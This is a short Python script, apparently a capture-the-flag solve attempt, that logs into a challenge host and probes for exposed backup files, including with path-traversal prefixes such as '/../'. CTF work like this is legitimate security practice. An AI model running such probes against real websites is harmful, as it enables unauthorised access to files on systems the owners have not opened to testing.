import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 备份文件直接访问")
print(f"[*] Target: {BASE_URL}")
print()

# 登录
uid = "3553c1effa0b4698895a4874cfbd86d8"
session.post(f"{BASE_URL}/login", data={"uid": uid})

# 尝试直接访问文件
backup_files = [
    "backup.zip",
    "backup.txt",
    "backup",
]

for filename in backup_files:
    paths = [
        f"/{filename}",
        f"/static/{filename}",
        f"/../{filename}",
        f"/../../{filename}",
    ]
    
    for path in paths:
        resp = session.get(f"{BASE_URL}{path}")
        if resp.status_code != 404:
            print(f"    [+] {path}: {resp.status_code}")
            print(f"    {resp.text[:500]}")

print("[*] 测试完成")
